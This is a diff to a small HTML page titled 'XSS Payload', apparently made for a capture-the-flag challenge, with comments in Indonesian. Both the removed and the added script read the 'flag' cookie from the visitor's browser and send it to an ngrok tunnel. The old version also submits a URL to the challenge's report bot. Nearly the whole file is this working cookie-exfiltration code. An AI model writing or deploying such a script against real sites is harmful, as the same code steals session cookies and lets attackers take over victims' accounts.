@@ -2,30 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>XSS Test</title>
+    <title>XSS Payload</title>
     <script>
-        // Skrip XSS untuk mencuri cookie
-        fetch('http://ctf.widyasecurity.com/report/', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ url: 'https://qyzan.github.io/joki/xss-challenge.html' })
-        }).then(response => response.json())
-          .then(data => {
-              if (data.success) {
-                  // Skrip ini akan dijalankan di browser korban
-                  const flag = document.cookie.match(/flag=([^;]+)/);
-                  if (flag) {
-                      fetch('http://ctf.widyasecurity.com/report/', {
-                          method: 'POST',
-                          headers: { 'Content-Type': 'application/json' },
-                          body: JSON.stringify({ url: 'https://6efe-180-252-62-25.ngrok-free.app/storeflag?flag=' + flag[1] })
-                      });
-                  }
-              }
-          });
+        document.addEventListener('DOMContentLoaded', function () {
+            // Mengambil cookie dengan nama 'flag'
+            const flag = document.cookie.match(/flag=([^;]+)/);
+            if (flag) {
+                // Ganti dengan URL endpoint Anda sendiri untuk menerima flag
+                fetch('https://0bcb-180-252-62-25.ngrok-free.app/storeflag?flag=' + encodeURIComponent(flag[1]), {
+                    method: 'GET'
+                });
+            }
+        });
     </script>
 </head>
 <body>
-    <h1>XSS Test</h1>
+    <h1>XSS Payload</h1>
 </body>
 </html>
